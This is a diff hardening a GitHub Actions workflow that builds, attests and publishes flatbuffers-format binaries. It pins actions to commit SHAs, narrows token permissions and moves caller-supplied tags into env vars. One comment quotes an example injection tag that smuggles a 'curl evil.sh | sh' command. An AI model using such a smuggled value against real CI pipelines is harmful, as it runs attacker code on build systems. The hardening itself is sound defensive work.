@@ -48,14 +48,10 @@ on:
         required: false
         type: string
 
+# Least privilege at the top of the file; each job below asks for
+# exactly the extra scopes it needs and nothing more.
 permissions:
-  contents: write
-  # SLSA build-provenance attestations (`actions/attest-build-provenance`)
-  # need an OIDC token to sign with Sigstore Fulcio + write to the
-  # repo's attestations API. The token expires when the job ends;
-  # nothing persists in the repo beyond the attestation itself.
-  id-token: write
-  attestations: write
+  contents: read
 
 jobs:
   build:
@@ -80,6 +76,14 @@ jobs:
             os: windows-2022
             artifact: flatbuffers-format-windows-x64.exe
     runs-on: ${{ matrix.os }}
+    permissions:
+      contents: read
+      # SLSA build-provenance attestations (`actions/attest-build-provenance`)
+      # need an OIDC token to sign with Sigstore Fulcio + write to the
+      # repo's attestations API. The token expires when the job ends;
+      # nothing persists in the repo beyond the attestation itself.
+      id-token: write
+      attestations: write
     # Hoist the Apple secrets to a job-level env so the `if:` on the
     # notarization step can check "are credentials present?" without
     # the disallowed `secrets.*` reference inside the conditional.
@@ -89,15 +93,21 @@ jobs:
       run:
         working-directory: flatbuffers-formatter
     steps:
-      - uses: actions/checkout@v4
-      - uses: pnpm/action-setup@v4
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
+        with:
+          persist-credentials: false
+      - uses: pnpm/action-setup@b906affcce14559ad1aafd4ab0e942779e9f58b1 # v4
         with:
           package_json_file: package.json
-      - uses: actions/setup-node@v7
+      # Deliberately NO dependency cache here. This job's output is
+      # attested and attached to a GitHub Release, so a poisoned restore
+      # would become the published binary. `package-manager-cache: false`
+      # is required as well as dropping `cache:` — setup-node v7 turns
+      # caching on by itself when package.json declares `packageManager`.
+      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7
         with:
           node-version: 22
-          cache: pnpm
-          cache-dependency-path: pnpm-lock.yaml
+          package-manager-cache: false
       - name: Install
         working-directory: .
         run: pnpm install --frozen-lockfile
@@ -204,20 +214,25 @@ jobs:
         shell: bash
         run: |
           set -euo pipefail
-          mkdir -p ../../_native-artifacts
+          # Absolute workspace path: this step runs with a per-package
+          # working-directory, so a relative ../.. would land outside the
+          # checkout while the attest/upload steps below read from the
+          # workspace root.
+          staging="$GITHUB_WORKSPACE/_native-artifacts"
+          mkdir -p "$staging"
           if [ "${{ runner.os }}" = "Windows" ]; then
             src=build/native/flatbuffers-format.exe
           else
             src=build/native/flatbuffers-format
           fi
-          dst="../../_native-artifacts/${{ matrix.artifact }}"
+          dst="$staging/${{ matrix.artifact }}"
           cp "$src" "$dst"
           # Re-compute the SHA over the renamed file — that's what
           # consumers download. The sidecar build-native.mjs emitted
           # is over the bare-filename version and would have the
           # wrong filename column for `sha256sum --check`.
           (
-            cd ../../_native-artifacts
+            cd "$staging"
             sha256sum "${{ matrix.artifact }}" > "${{ matrix.artifact }}.sha256"
           )
 
@@ -225,19 +240,19 @@ jobs:
       # using the workflow's OIDC token; the attestation links the
       # downloaded artefact to this exact GitHub Actions run (commit
       # SHA, workflow file, runner identity). Consumers verify with:
-      #   gh attestation verify <file> --repo emindeniz99/playground
+      #   gh attestation verify <file> --repo emindeniz99/flatbuffers-format
       # We attest both the binary AND its SHA sidecar so the sidecar
       # itself becomes trustworthy (a tampered sidecar would either
       # have no attestation or one with a wrong subject hash).
       - name: Attest build provenance
         working-directory: ${{ github.workspace }}
-        uses: actions/attest-build-provenance@v4
+        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4
         with:
           subject-path: |
             _native-artifacts/${{ matrix.artifact }}
             _native-artifacts/${{ matrix.artifact }}.sha256
 
-      - uses: actions/upload-artifact@v4
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
         with:
           name: ${{ matrix.artifact }}
           path: |
@@ -265,34 +280,45 @@ jobs:
     permissions:
       contents: write
     steps:
-      - uses: actions/checkout@v4
-      - uses: actions/download-artifact@v4
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
+        with:
+          persist-credentials: false
+      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
         with:
           path: _native-artifacts
           merge-multiple: true
+      # A release tag name and a workflow_dispatch input are both
+      # caller-supplied strings. Bind them to env vars instead of
+      # splicing them into the shell source, so a tag like
+      # `x"; curl evil.sh | sh; #` is inert data, not code.
       - name: Determine release tag
         id: tag
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          RELEASE_TAG: ${{ github.event.release.tag_name }}
+          INPUT_TAG: ${{ inputs.tag }}
         run: |
-          if [ "${{ github.event_name }}" = "release" ]; then
-            echo "value=${{ github.event.release.tag_name }}" >> "$GITHUB_OUTPUT"
+          if [ "$EVENT_NAME" = "release" ]; then
+            echo "value=$RELEASE_TAG" >> "$GITHUB_OUTPUT"
           else
-            echo "value=${{ inputs.tag }}" >> "$GITHUB_OUTPUT"
+            echo "value=$INPUT_TAG" >> "$GITHUB_OUTPUT"
           fi
       - name: Upload to release
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          TAG: ${{ steps.tag.outputs.value }}
+          REPO: ${{ github.repository }}
         run: |
-          tag='${{ steps.tag.outputs.value }}'
           # Only upload to flatbuffers-format@* releases; other releases
           # (vscode-flatbuffers@*, tree-sitter-flatbuffers@*, etc.) get
           # nothing from this workflow.
-          case "$tag" in
+          case "$TAG" in
             flatbuffers-format@*) ;;
-            *) echo "Skipping: tag '$tag' is not a flatbuffers-format release"; exit 0 ;;
+            *) echo "Skipping: tag '$TAG' is not a flatbuffers-format release"; exit 0 ;;
           esac
           # Both the binary and its sidecar.
           for f in _native-artifacts/flatbuffers-format-*; do
             [ -f "$f" ] || continue
-            echo "Uploading $f → $tag"
-            gh release upload "$tag" "$f" --clobber --repo "${{ github.repository }}"
+            echo "Uploading $f → $TAG"
+            gh release upload "$TAG" "$f" --clobber --repo "$REPO"
           done
